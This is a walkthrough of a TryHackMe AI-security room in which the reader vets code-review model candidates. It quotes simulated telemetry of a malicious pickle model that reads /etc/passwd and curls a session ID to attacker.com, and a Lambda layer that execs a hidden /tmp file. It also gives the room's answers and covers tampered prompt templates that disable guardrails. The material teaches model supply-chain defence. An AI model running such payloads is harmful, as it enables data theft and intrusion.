---
title: "Checkpoint - TryHackMe"
date: 2026-04-19 02:00:00 +0000
categories: [TryHackMe, Writeups]
tags: [ai, ai-security, prompt-injection, jailbreaking]
image: /assets/img/writeups/covers/checkpoint.png
---
# Checkpoint - TryHackMe

![1.png](/assets/img/writeups/checkpoint/1.png)
**Category:** AI Security<br>**Difficulty:** Easy

> Warning: Full solution ahead. Try the room yourself first!

---

## Scenario

TryTrainMe's CISO has a strict rule: no model reaches production without completing a full sandboxed evaluation cycle. Four code review model candidates have been submitted and evaluated against the same test pull request — a change that removes input validation from an authentication endpoint. Three have already been flagged by automated screening. Your job is to assess Candidate A and make the final production call.

![1.png](/assets/img/writeups/checkpoint/candidate.png)

---

## Reading the Telemetry — Candidates B, C and D

Before touching the agent, the room gives you telemetry logs for three of the four candidates. Read them carefully because the last question asks you to pick one for production.

#### **Candidate B — `code_reviewer_lite.safetensors`**
Clean load. Uses a verified internal prompt template. Guardrails enabled. Verdict was "Needs Changes" which is the correct response to a PR that removes input validation. No red flags anywhere.

#### **Candidate C — `pr_analyzer_v3.h5`**
A Lambda layer was detected during load containing `exec(open('/tmp/.cache').read())`. This is malicious code designed to execute arbitrary instructions from a hidden file at runtime. Flagged as dangerous.

#### **Candidate D — `api.reviewsvc.io`**
This one is an external API with undisclosed model provenance, no compliance certificate, and a vendor-managed prompt template that can't be inspected. It also returned "Approved" on a PR that removes authentication validation — exactly the wrong answer. Do not trust it.

---

## Candidate A — Opening the Agent

Click the Open Agent button to load Candidate A. The telemetry panel streams automatically before you send any messages. Read both sessions in full before doing anything.
![1.png](/assets/img/writeups/checkpoint/2.png)

The telemetry output:

```
MODEL LOAD BEGIN: /models/code_reviewer_pro.pkl (pickle)
IMPORT DETECTED: module=os [DANGEROUS]
FILE ACCESS: /etc/passwd mode=rb [SUSPICIOUS]
SYSTEM CALL: os.system("curl http://attacker.com/beacon -d session=eval-7f2a9c3b") [CRITICAL]
MODEL LOAD COMPLETE: object_type=int [SUSPICIOUS]

PROMPT TEMPLATE LOAD: source=external (CommunityReview v4.2) [UNVERIFIED]
GUARDRAIL CHECK: security_review_flag=disabled [WARNING]
INFERENCE COMPLETE: verdict=Approved
```

---

## Q1 — What file did Candidate A attempt to read?

**Answer: `/etc/passwd`**<br><br>The `/etc/passwd` file contains a list of all user accounts on a Linux system. Attackers read it to map out users on the machine — it's a classic early-stage reconnaissance move. A code review model has absolutely no legitimate reason to be touching this file.

---

## Q2 — What security guardrail flag is disabled?

**Answer: `security_review_flag`**<br><br>This guardrail is what enforces safe and policy-compliant behaviour during inference. With it disabled the model operates without restrictions, which explains why it returned "Approved" on a PR that removes authentication validation — a decision that should immediately raise a flag.

---

## Q3 — What policy template governs its review behaviour?

**Answer: `CommunityReview`**<br><br>The telemetry shows the prompt template was loaded from an external unverified source: `CommunityReview v4.2`. Unlike Candidate B which uses TryTrainMe's own verified internal template, this model is pulling its instructions from outside the organisation. That means the review behaviour can be influenced or tampered with by whoever controls that template.<br><br>This connects directly to the disabled guardrail — the two failures are not independent. The external unverified template is likely what disabled the security guardrail in the first place. One compromised source caused both problems.

![1.png](/assets/img/writeups/checkpoint/3.png)

---

## Q4 — Retrieving the Flag

The beacon system call in the telemetry contains a session ID:

```
session=eval-7f2a9c3b
```

Send this session ID to the agent in your query. The agent recognises it and returns the flag.
![1.png](/assets/img/writeups/checkpoint/4.png)
**Why does this work?** The malicious payload inside the pickle file was designed to beacon home with a session identifier so the attacker could track successful evaluation runs. By feeding that same session ID back to the agent you're essentially proving you read and understood the telemetry — and the room rewards you with the flag.

---

## Q5 — Production Recommendation for Candidate A

**Answer: Reject**<br><br>The evidence is overwhelming. Candidate A reads `/etc/passwd` on load, makes an outbound beacon call to `attacker.com`, disables its own security guardrail, loads instructions from an unverified external template, and approves a PR that removes authentication validation. Every single one of those is a critical failure.

---

## Q6 — Which Candidate to Approve for Production?

**Answer: Candidate B**<br><br>Going back to the telemetry from the start, Candidate B is the only one that passes every check. Clean load, verified internal prompt template, guardrails enabled, and it correctly flagged the dangerous PR as needing changes. It's the only candidate that did its actual job.

---


## What This Room Teaches You

The format of a model file matters. Pickle files can execute arbitrary code on load — Candidate A exploited this to read system files and beacon out before inference even started. SafeTensors (Candidate B) is a safer format specifically designed to prevent this. Beyond file format, always verify where a model's instructions come from. An external unverified prompt template is an open door for an attacker to control model behaviour without ever touching the model weights themselves.

---

*Written by monasx0 | TryHackMe — Checkpoint*
